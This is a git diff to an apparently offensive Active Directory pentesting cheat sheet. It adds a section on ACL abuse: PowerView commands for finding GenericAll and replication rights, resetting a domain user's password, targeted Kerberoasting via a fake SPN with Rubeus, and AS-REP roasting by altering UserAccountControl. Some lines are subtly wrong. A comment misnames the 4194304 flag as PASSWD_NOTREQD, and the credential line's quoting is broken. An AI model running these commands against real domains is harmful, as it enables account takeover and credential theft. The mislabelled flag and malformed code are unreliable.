@@ -332,7 +332,7 @@ dir /s *pass* == *cred* == *vnc* == *.config*
 ```shell
 # Native Runas
 # Local - Changing to user "jane"
-runas /user:jane cmd # # Enter the password now when asked
+runas /user:jane cmd # Enter the password now when asked
 
 # Domain - Changing to user "john"
 runas /netonly /user:vorkharium.com\john cmd
@@ -617,10 +617,40 @@ samdump2 SYSTEM SAM
 ```shell
 Comming soon.
 ```
-### ACLs
+### ACL Abuse Attacks
+Note: We can enumerate ACLs using BloodHound too. But using PowerView.ps1 can give us some results that wouldn't show up on BloodHound otherwise.
 ```shell
-Comming soon.
+# Enumerating ACLs with PowerView.ps1
+# ACLs Enumeration with NameToSid
+$sid = Convert-NameToSid -Name john
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+# Detect Objects with ACLs (GenericAll) - Replace GenericAll for any other right, like WriteDacl
+Get-ObjectAcl -DistinguishedName "dc=vorkharium,dc=com" -ResolveGUIDs | 
+Where {	$_.ObjectType -match 'replication-get' -or $_.ActiveDirectoryRights -match 'GenericAll' }
+# Or
+Get-DomainObjectAcl -TargetIdentity "dc=vorkharium,dc=com" -ResolveGUIDs | 
+Where {	$_.ObjectType -match 'replication-get' -or $_.ActiveDirectoryRights -match 'GenericAll' }
+
+# GenericAll on User to Change Password, Kerberoast and AS-REP Roast
+# 1. Change the vulnerable user password using:
+
+net user john NotPassword123 /domain
+
+# 2. Kerberoast the vulnerable user after assigning an SPN
+
+$Pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('vorkharium.com\john, $Pass')
+Set-DomainObject -Credential $Cred -Identity targetusername -Set @{serviceprincipalname="nonexistant/fake"}
+.\Rubeus.exe kerberoast /user:targetusername /nowrap
+Set-DomainObject -Credential $Cred -Identity targetusername -Clear serviceprincipalname -Verbose
+
+# 3. AS-REP Roast the vulnerable user after disabling pre-authentication for the vulnerable user
+Set-DomainObject -Identity targetusername -XOR @{UserAccountControl=4194304}
+# 4194304 sets the PASSWD_NOTREQD flag, allowing the account to operate without a required password
 ```
+More ACLs Abuse Attacks on https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
+
 ### MSSQL to gain Shell Access
 ```shell
 Comming soon.
